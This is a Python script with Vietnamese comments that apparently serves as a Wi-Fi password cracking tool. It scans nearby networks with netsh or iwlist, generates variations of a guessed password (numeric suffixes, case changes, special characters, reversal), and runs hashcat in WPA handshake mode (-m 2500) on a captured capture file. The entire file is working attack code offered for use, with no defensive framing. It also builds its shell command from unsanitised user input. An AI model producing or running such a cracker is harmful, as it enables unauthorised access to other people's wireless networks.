import subprocess
import os

# Hàm quét các mạng Wi-Fi hiện có (Windows sử dụng netsh, Linux sử dụng iwlist)
def scan_wifi_networks():
    networks = []
    try:
        if os.name == 'nt':  # Nếu chạy trên Windows
            result = subprocess.run(['netsh', 'wlan', 'show', 'network'], capture_output=True, text=True)
            networks = parse_networks_windows(result.stdout)
        else:  # Nếu chạy trên Linux (hoặc MacOS)
            result = subprocess.run(['iwlist', 'scan'], capture_output=True, text=True)
            networks = parse_networks_linux(result.stdout)
    except Exception as e:
        print(f"Error scanning networks: {e}")
    return networks

# Hàm phân tích kết quả quét mạng trên Windows
def parse_networks_windows(output):
    networks = []
    for line in output.splitlines():
        if "SSID" in line:
            networks.append(line.split(":")[1].strip())
    return networks

# Hàm phân tích kết quả quét mạng trên Linux
def parse_networks_linux(output):
    networks = []
    for line in output.splitlines():
        if "ESSID" in line:
            networks.append(line.split(":")[1].strip().replace('"', ''))
    return networks

# Hàm sinh các biến thể của mật khẩu
def generate_variations(base_password):
    variations = set()
    print("Generating password variations...")

    # Thêm các số vào cuối (giới hạn để tránh mất thời gian)
    for i in range(1, 10001):  # Thử từ 1 đến 10,000 (giới hạn để nhanh hơn)
        variation = base_password + str(i)
        variations.add(variation)
        print(f"Generated: {variation}")
    
    # Thay đổi chữ cái (viết hoa, viết thường)
    for variation in [base_password.capitalize(), base_password.lower(), base_password.upper()]:
        variations.add(variation)
        print(f"Generated: {variation}")

    # Thêm ký tự đặc biệt
    special_chars = ['@', '#', '$', '%', '&', '!', '*']
    for char in special_chars:
        for variation in [base_password + char, char + base_password]:
            variations.add(variation)
            print(f"Generated: {variation}")

    # Thêm biến thể đảo ngược từ gốc
    reversed_variation = base_password[::-1]
    variations.add(reversed_variation)
    print(f"Generated: {reversed_variation}")

    return variations

# Hàm brute force thử tất cả các biến thể với Hashcat
def brute_force_with_hashcat(handshake_file, base_password):
    variations = generate_variations(base_password)
    print(f"Attempting to brute force with base password: {base_password}")

    # Lưu mật khẩu vào tệp tạm thời để sử dụng với Hashcat
    with open("temp_wordlist.txt", "w") as f:
        for password in variations:
            f.write(password + "\n")
    
    # Log mật khẩu đang thử và chạy Hashcat
    print("Testing passwords:")
    try:
        for password in variations:
            print(f"Trying: {password}")  # Hiển thị mật khẩu đang thử
        
        # Sau khi ghi tất cả, chạy Hashcat với wordlist tạm thời
        command = f"hashcat -m 2500 -a 0 {handshake_file} temp_wordlist.txt"
        print(f"Running Hashcat command: {command}")
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        
        if ' cracked' in result.stdout:
            print("Password cracked successfully!")
        else:
            print("Password not found.")
    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        # Xóa file wordlist tạm thời
        if os.path.exists("temp_wordlist.txt"):
            os.remove("temp_wordlist.txt")

if __name__ == "__main__":
    # Quét các mạng Wi-Fi
    print("Scanning for Wi-Fi networks...")
    networks = scan_wifi_networks()
    if networks:
        print("Available Wi-Fi networks:")
        for i, network in enumerate(networks, 1):
            print(f"{i}. {network}")
        network_choice = int(input("Select the network by number: "))
        selected_network = networks[network_choice - 1]
        print(f"Selected network: {selected_network}")
    else:
        print("No networks found.")
        exit(1)

    # Nhập tên file handshake và mật khẩu cơ sở
    handshake_file = input("Enter the path to the capture file (e.g., capture.hccapx): ")  # File handshake
    base_password = input("Enter the base password or guess: ")  # Nhập mật khẩu cơ sở từ người dùng
    brute_force_with_hashcat(handshake_file, base_password)
